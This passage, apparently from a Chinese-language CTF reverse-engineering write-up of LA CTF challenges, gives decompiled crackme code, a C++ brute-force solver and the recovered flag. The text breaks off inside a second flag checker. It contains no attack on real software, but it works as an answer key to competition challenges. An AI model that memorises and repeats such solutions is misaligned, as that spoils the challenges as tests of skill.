<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// al</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">6</span>]; <span class="comment">// [rsp+Ah] [rbp-1A6h] BYREF</span></span><br><span class="line">  __int64 *proc_1[<span class="number">12</span>]; <span class="comment">// [rsp+10h] [rbp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+70h] [rbp-140h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+80h] [rbp-130h] BYREF</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+88h] [rbp-128h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+90h] [rbp-120h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+98h] [rbp-118h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+A0h] [rbp-110h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+A8h] [rbp-108h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+B0h] [rbp-100h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+B8h] [rbp-F8h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+C0h] [rbp-F0h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+C8h] [rbp-E8h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+D0h] [rbp-E0h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+D8h] [rbp-D8h]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [rsp+E0h] [rbp-D0h]</span></span><br><span class="line">  __int64 input_proc[<span class="number">2</span>]; <span class="comment">// [rsp+F0h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// [rsp+100h] [rbp-B0h]</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// [rsp+190h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+194h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+198h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+19Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  *s = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  v14 = <span class="number">0LL</span>;</span><br><span class="line">  v15 = <span class="number">0LL</span>;</span><br><span class="line">  v16 = <span class="number">0LL</span>;</span><br><span class="line">  v17 = <span class="number">0LL</span>;</span><br><span class="line">  v18 = <span class="number">0LL</span>;</span><br><span class="line">  v19 = <span class="number">0LL</span>;</span><br><span class="line">  v20 = <span class="number">0LL</span>;</span><br><span class="line">  v21 = <span class="number">0LL</span>;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(proc_1, <span class="number">0</span>, <span class="keyword">sizeof</span>(proc_1));</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Meow Meow? &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">95</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) % <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;WOOOOOOOF BARK BARK BARK&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = i;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v4 = trans(s[i]);</span><br><span class="line">      *(proc_1 + i) = v4;                       <span class="comment">// lowercase-&gt;&#x27;a&#x27; offset</span></span><br><span class="line">                                                <span class="comment">// _ -&gt;26</span></span><br><span class="line">                                                <span class="comment">// &#123; -&gt;27</span></span><br><span class="line">                                                <span class="comment">// &#125; -&gt;28</span></span><br><span class="line">      <span class="keyword">if</span> ( *(proc_1 + i) == <span class="number">0xFF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;WOOOOOOOF BARK BARK BARK&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>(name, <span class="string">&quot;data0&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = j;</span><br><span class="line">      <span class="keyword">if</span> ( v6 &gt;= <span class="built_in">strlen</span>(s) / <span class="number">5</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ++name[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">if</span> ( access(name, <span class="number">0</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v25 = <span class="number">0</span>;</span><br><span class="line">          v24 = <span class="number">0</span>;</span><br><span class="line">          input_proc[<span class="number">0</span>] = s;</span><br><span class="line">          input_proc[<span class="number">1</span>] = proc_1;</span><br><span class="line">          GOMP_parallel(func, input_proc, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">          v25 = v24;</span><br><span class="line">          <span class="keyword">if</span> ( v24 == <span class="number">7</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;MEOW&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">999</span>; ++k )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">putchar</span>(<span class="number">33</span>);</span><br><span class="line">              fflush(<span class="built_in">stdout</span>);</span><br><span class="line">              usleep(<span class="number">0x3E8</span>u);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Woof.....&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;WOOOOOOOF BARK BARK BARK&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">4LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      ++name[<span class="number">4</span>];</span><br><span class="line">      <span class="keyword">if</span> ( access(name, <span class="number">0</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;WOOOOOOOF BARK BARK BARK&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error: make sure you have downloaded and extracted the data.zip files into the same folder as the executable.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入的长度为5n 使用GOMP_parallel创建了func的线程 func:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_55811199B67A</span><span class="params">(__int64 input_proc)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r12d</span></span><br><span class="line">  <span class="type">int</span> num_threads; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> thread_num; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> buf[<span class="number">29</span>]; <span class="comment">// [rsp+10h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> file[<span class="number">4</span>]; <span class="comment">// [rsp+85h] [rbp-2Bh] BYREF</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+89h] [rbp-27h]</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [rsp+8Bh] [rbp-25h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+8Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+90h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> key; <span class="comment">// [rsp+94h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+98h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// [rsp+9Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(*input_proc) / <span class="number">5</span>;</span><br><span class="line">  num_threads = omp_get_num_threads();</span><br><span class="line">  thread_num = omp_get_thread_num();</span><br><span class="line">  v4 = v1 / num_threads;</span><br><span class="line">  v5 = v1 % num_threads;</span><br><span class="line">  <span class="keyword">if</span> ( thread_num &lt; v1 % num_threads )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = v4 * thread_num + v5;</span><br><span class="line">  v7 = v6 + v4;</span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt; v6 + v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = v6;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *file = <span class="number">0x61746164</span>;</span><br><span class="line">      v11 = (v16 + <span class="number">49</span>);</span><br><span class="line">      fd = open(file, <span class="number">0</span>);</span><br><span class="line">      key = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        lseek(fd, (<span class="number">0x74</span> * key), <span class="number">0</span>);</span><br><span class="line">        v12 = *(*(input_proc + <span class="number">8</span>) + <span class="number">5</span> * v16 + i);<span class="comment">// key = 0</span></span><br><span class="line">                                                <span class="comment">// loop(0, 5):</span></span><br><span class="line">                                                <span class="comment">//    offset += key * 0x74</span></span><br><span class="line">                                                <span class="comment">//    key = data[offset + proc[5 * n + i]]</span></span><br><span class="line">                                                <span class="comment">//    offset += 0x74</span></span><br><span class="line">        read(fd, buf, <span class="number">0x74</span>uLL);</span><br><span class="line">        key = buf[v12];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( key == <span class="number">0x63617400</span> )</span><br><span class="line">        ++v17;</span><br><span class="line">      ++v16;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v16 &lt; v7 );</span><br><span class="line">  &#125;</span><br><span class="line">  result = v17;</span><br><span class="line">  _InterlockedAdd((input_proc + <span class="number">16</span>), v17);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5 bytes一组用输入来控制文件指针 要求最后读到的数据中某处是0x63617400(<code>cat\x0</code>) 不知道怎么逆向计算出这5 bytes 直接爆破:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// for(int _ = 1; _ &lt;= 7; _++)&#123;</span></span><br><span class="line">    <span class="comment">//     string data = &quot;data&quot; + to_string(_);</span></span><br><span class="line">    <span class="comment">//     auto fd = open(data.c_str(), 0);</span></span><br><span class="line">    <span class="comment">//     int table[] = &#123;0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28&#125;;</span></span><br><span class="line">    <span class="comment">//     for(int a : table)&#123;</span></span><br><span class="line">    <span class="comment">//         bool f = 0;</span></span><br><span class="line">    <span class="comment">//         for(int b : table)&#123;</span></span><br><span class="line">    <span class="comment">//             for(int c : table)&#123;</span></span><br><span class="line">    <span class="comment">//                 for(int d : table)&#123;</span></span><br><span class="line">    <span class="comment">//                     for(int e : table)&#123;</span></span><br><span class="line">    <span class="comment">//                         int key = 0;</span></span><br><span class="line">    <span class="comment">//                         int buf[29];</span></span><br><span class="line">    <span class="comment">//                         int temp[5] = &#123;a, b, c, d, e&#125;;</span></span><br><span class="line">    <span class="comment">//                         for(int __ = 0; __ &lt;= 4; __++)&#123;</span></span><br><span class="line">    <span class="comment">//                             lseek(fd, 0x74 * key, 0);</span></span><br><span class="line">    <span class="comment">//                             int v = temp[__];</span></span><br><span class="line">    <span class="comment">//                             read(fd, buf, 0x74);</span></span><br><span class="line">    <span class="comment">//                             key = buf[v];</span></span><br><span class="line">    <span class="comment">//                         &#125;</span></span><br><span class="line">    <span class="comment">//                         if(key == 0x63617400)&#123;</span></span><br><span class="line">    <span class="comment">//                             printf(&quot;&#123;%d, %d, %d, %d, %d&#125;,\n&quot;, a, b, c, d, e);</span></span><br><span class="line">    <span class="comment">//                             f = 1;</span></span><br><span class="line">    <span class="comment">//                             break;</span></span><br><span class="line">    <span class="comment">//                         &#125;</span></span><br><span class="line">    <span class="comment">//                     &#125;</span></span><br><span class="line">    <span class="comment">//                     if(f) break;</span></span><br><span class="line">    <span class="comment">//                 &#125;</span></span><br><span class="line">    <span class="comment">//                 if(f) break;</span></span><br><span class="line">    <span class="comment">//             &#125;</span></span><br><span class="line">    <span class="comment">//             if(f) break;</span></span><br><span class="line">    <span class="comment">//         &#125;</span></span><br><span class="line">    <span class="comment">//         if(f) break;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     close(fd);</span></span><br><span class="line">    <span class="comment">//     printf(&quot;====================\n&quot;);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="type">char</span> alpha_table[<span class="number">29</span>] = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>&#125;;</span><br><span class="line">    <span class="type">int</span> flag_pieces[<span class="number">7</span>][<span class="number">5</span>] = &#123;</span><br><span class="line">            &#123;<span class="number">11</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">19</span>, <span class="number">5</span>&#125;,</span><br><span class="line">            &#123;<span class="number">27</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">22</span>&#125;,</span><br><span class="line">            &#123;<span class="number">26</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">26</span>&#125;,</span><br><span class="line">            &#123;<span class="number">5</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">3</span>&#125;,</span><br><span class="line">            &#123;<span class="number">26</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">4</span>&#125;,</span><br><span class="line">            &#123;<span class="number">15</span>, <span class="number">2</span>, <span class="number">18</span>, <span class="number">8</span>, <span class="number">7</span>&#125;,</span><br><span class="line">            &#123;<span class="number">13</span>, <span class="number">23</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">28</span>&#125;,</span><br><span class="line">        &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, alpha_table[flag_pieces[i][j]]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// lactf&#123;meow_you_found_me_epcsihnxos&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>爆破花了5mins左右 不知道这是不是预期解 得到的flag片段刚好就是按顺序排列的 说明GOMP_parallel函数产生的线程的id就是从0开始递增而不是随机的</p>
<h2 id="rbp-函数控制"><a href="#rbp-函数控制" class="headerlink" title="rbp | 函数控制"></a><strong>rbp</strong> | 函数控制</h2><p>DIE查壳 无壳64x IDA64打开:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_71247</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-FCh]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+18h] [rbp-F8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-F4h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+20h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+24h] [rbp-ECh]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+28h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">int</span> m; <span class="comment">// [rsp+2Ch] [rbp-E4h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+30h] [rbp-E0h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+38h] [rbp-D8h]</span></span><br><span class="line">  __int128 v13[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-D0h] BYREF</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+60h] [rbp-B0h]</span></span><br><span class="line">  <span class="type">int</span> v15[<span class="number">38</span>]; <span class="comment">// [rsp+70h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v12 = sub_717F0(a1);</span><br><span class="line">  <span class="built_in">memset</span>(v13, <span class="number">0</span>, <span class="keyword">sizeof</span>(v13));</span><br><span class="line">  v14 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">2</span>;</span><br><span class="line">LABEL_7:</span><br><span class="line">  <span class="keyword">while</span> ( v4 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ++v5;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">2</span>; i &lt; v5; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !(v5 % i) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">    v1 = v4++;</span><br><span class="line">    *(v13 + v1) = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v12 == DWORD1(v13[<span class="number">0</span>]) * DWORD2(v13[<span class="number">0</span>]) )</span><br><span class="line">  &#123;</span><br><span class="line">    v15[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    v15[<span class="number">1</span>] = <span class="number">13</span>;</span><br><span class="line">    v15[<span class="number">2</span>] = <span class="number">15</span>;</span><br><span class="line">    v15[<span class="number">3</span>] = <span class="number">24</span>;</span><br><span class="line">    v15[<span class="number">4</span>] = <span class="number">10</span>;</span><br><span class="line">    v15[<span class="number">5</span>] = <span class="number">23</span>;</span><br><span class="line">    v15[<span class="number">6</span>] = <span class="number">13</span>;</span><br><span class="line">    v15[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">    v15[<span class="number">8</span>] = <span class="number">2</span>;</span><br><span class="line">    v15[<span class="number">9</span>] = <span class="number">21</span>;</span><br><span class="line">    v15[<span class="number">10</span>] = <span class="number">7</span>;</span><br><span class="line">    v15[<span class="number">11</span>] = <span class="number">26</span>;</span><br><span class="line">    v15[<span class="number">12</span>] = <span class="number">15</span>;</span><br><span class="line">    v15[<span class="number">13</span>] = <span class="number">2</span>;</span><br><span class="line">    v15[<span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">    v15[<span class="number">15</span>] = <span class="number">23</span>;</span><br><span class="line">    v15[<span class="number">16</span>] = <span class="number">5</span>;</span><br><span class="line">    v15[<span class="number">17</span>] = <span class="number">24</span>;</span><br><span class="line">    v15[<span class="number">18</span>] = <span class="number">24</span>;</span><br><span class="line">    v15[<span class="number">19</span>] = <span class="number">21</span>;</span><br><span class="line">    v15[<span class="number">20</span>] = <span class="number">23</span>;</span><br><span class="line">    v15[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">    v15[<span class="number">22</span>] = <span class="number">18</span>;</span><br><span class="line">    v15[<span class="number">23</span>] = <span class="number">15</span>;</span><br><span class="line">    v15[<span class="number">24</span>] = <span class="number">10</span>;</span><br><span class="line">    v15[<span class="number">25</span>] = <span class="number">7</span>;</span><br><span class="line">    v15[<span class="number">26</span>] = <span class="number">5</span>;</span><br><span class="line">    v15[<span class="number">27</span>] = <span class="number">18</span>;</span><br><span class="line">    v15[<span class="number">28</span>] = <span class="number">0</span>;</span><br><span class="line">    v15[<span class="number">29</span>] = <span class="number">29</span>;</span><br><span class="line">    v15[<span class="number">30</span>] = <span class="number">23</span>;</span><br><span class="line">    v15[<span class="number">31</span>] = <span class="number">26</span>;</span><br><span class="line">    v15[<span class="number">32</span>] = <span class="number">24</span>;</span><br><span class="line">    v15[<span class="number">33</span>] = <span class="number">15</span>;</span><br><span class="line">    v15[<span class="number">34</span>] = <span class="number">29</span>;</span><br><span class="line">    v15[<span class="number">35</span>] = <span class="number">0</span>;</span><br><span class="line">    v11 = <span class="number">1LL</span>;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">5</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">5</span>; ++k )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = v7++;</span><br><span class="line">        <span class="keyword">if</span> ( (a1[j] ^ a1[k]) != v15[v3] )</span><br><span class="line">        &#123;</span><br><span class="line">          result = <span class="number">0LL</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v11 *= a1[j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v11 == <span class="number">0x15F6D1945A0</span>LL )    <span class="comment">//↑head with lactf&#123;</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a1[<span class="number">34</span>] == <span class="number">125</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( m = <span class="number">6</span>; m &lt;= <span class="number">33</span>; ++m )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( flag != <span class="number">-1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            reset(flag);</span><br><span class="line">            flag = <span class="number">-1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( lowcase(a1[m]) != <span class="number">1</span> || num(a1[m]) != <span class="number">1</span> || underline(a1[m]) != <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = <span class="number">0LL</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        result = check(byte_70B00, <span class="string">&quot;vwbowpcjrhpkobfryu&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_32:</span><br><span class="line">  <span class="keyword">if</span> ( v16 != __readfsqword(<span class="number">0x28</span>u) )</span><br><span class="line">    <span class="keyword">return</span> sub_71800();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//lowercase:</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_68000</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">96</span> || a1 &gt; <span class="number">122</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v2 = dword_70AE4++;</span><br><span class="line">  byte_70B00[v2] = a1;</span><br><span class="line">  <span class="keyword">if</span> ( (a1 == <span class="number">98</span> || a1 == <span class="number">99</span> || a1 == <span class="number">104</span> || a1 == <span class="number">115</span> || a1 == <span class="number">116</span>)</span><br><span class="line">    &amp;&amp; ++count != <span class="number">2</span></span><br><span class="line">    &amp;&amp; count != <span class="number">8</span></span><br><span class="line">    &amp;&amp; count != <span class="number">9</span></span><br><span class="line">    &amp;&amp; count != <span class="number">12</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    flag = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">100</span> )</span><br><span class="line">    flag = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//num:</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_69000</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">47</span> || a1 &gt; <span class="number">57</span> )</span><br><span class="line">    